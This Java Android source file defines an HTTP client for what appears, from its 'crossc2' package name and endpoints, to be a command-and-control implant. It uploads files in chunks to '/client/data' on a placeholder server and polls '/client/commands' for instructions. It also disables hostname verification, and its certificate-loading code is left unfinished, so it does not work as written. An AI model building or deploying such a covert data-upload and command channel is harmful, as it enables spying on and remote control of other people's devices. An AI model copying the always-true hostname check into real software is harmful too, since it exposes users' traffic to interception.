package com.example.crossc2;

import android.util.Log;
import okhttp3.*;
import okio.ByteString;
import org.json.JSONObject;

import javax.net.ssl.*;
import java.io.IOException;
import java.io.InputStream;
import java.security.KeyStore;
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

public class ApiClient {

    private static final String TAG = "ApiClient" ;
    private static final String SERVER_URL = "https://your_server_ip:443"; // Replace with your server IP
    private OkHttpClient client;

    public ApiClient() {
        try {
            // Load the self-signed certificate
            // You need to include your server.crt file in the assets folder
            CertificateFactory cf = CertificateFactory.getInstance("X.509");
            InputStream caInput = null; // Replace with code to load cert from assets or raw resources
            // Example: caInput = context.getResources().openRawResource(R.raw.server); // if cert is in res/raw
            // Example: caInput = context.getAssets().open("server.crt"); // if cert is in assets

            Certificate ca;
            try {
                ca = cf.generateCertificate(caInput);
                Log.d(TAG, "ca=" + ((java.security.cert.X509Certificate) ca).getSubjectDN());
            } finally {
                if (caInput != null) {
                    caInput.close();
                }
            }

            // Create a KeyStore containing our trusted CAs
            String keyStoreType = KeyStore.getDefaultType();
            KeyStore keyStore = KeyStore.getInstance(keyStoreType);
            keyStore.load(null, null);
            keyStore.setCertificateEntry("ca", ca);

            // Create a TrustManager that trusts the CAs in our KeyStore
            String tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();
            TrustManagerFactory tmf = TrustManagerFactory.getInstance(tmfAlgorithm);
            tmf.init(keyStore);

            // Create an SSLContext that uses our TrustManager
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, tmf.getTrustManagers(), null);

            // Create an OkHttpClient with the custom SSLContext
            client = new OkHttpClient.Builder()
                    .sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) tmf.getTrustManagers()[0])
                    .hostnameVerifier(new HostnameVerifier() {
                        @Override
                        public boolean verify(String hostname, SSLSession session) {
                            // WARNING: This is insecure and should only be used for testing with self-signed certs
                            // In production, you would verify the hostname against the certificate&apos;s subject alternative names
                            return true; // Trust all hostnames for self-signed cert testing
                        }
                    })
                    .connectTimeout(10, TimeUnit.SECONDS)
                    .readTimeout(10, TimeUnit.SECONDS)
                    .writeTimeout(10, TimeUnit.SECONDS)
                    .build();

        } catch (Exception e) {
            Log.e(TAG, "Error building OkHttpClient", e);
            // Handle error appropriately
        }
    }

    public void sendData(String dataType, String data, String filename, String chunk, int offset, int totalSize, Callback callback) {
        if (client == null) {
            Log.e(TAG, "ApiClient not initialized.");
            return;
        }

        JSONObject jsonBody = new JSONObject();
        try {
            jsonBody.put("type", dataType);
            jsonBody.put("data", data);
            if (filename != null) jsonBody.put("filename", filename);
            if (chunk != null) jsonBody.put("chunk", chunk);
            if (offset >= 0) jsonBody.put("offset", offset);
            if (totalSize > 0) jsonBody.put("total_size", totalSize);

        } catch (Exception e) {
            Log.e(TAG, "Error creating JSON body", e);
            return;
        }

        RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), jsonBody.toString());
        Request request = new Request.Builder()
                .url(SERVER_URL + "/client/data")
                .post(body)
                .build();

        client.newCall(request).enqueue(callback);
    }

    public void fetchCommands(Callback callback) {
        if (client == null) {
            Log.e(TAG, "ApiClient not initialized.");
            return;
        }

        Request request = new Request.Builder()
                .url(SERVER_URL + "/client/commands")
                .get()
                .build();

        client.newCall(request).enqueue(callback);
    }

    // Helper method to read the self-signed certificate from resources/assets
    // This needs to be implemented based on where you place the server.crt file
    private InputStream getCertificateInputStream() throws IOException {
        // TODO: Implement loading the certificate from assets or raw resources
        // Example for assets: return context.getAssets().open("server.crt");
        // Example for raw resources: return context.getResources().openRawResource(R.raw.server);
        throw new IOException("Certificate loading not implemented.");
    }
}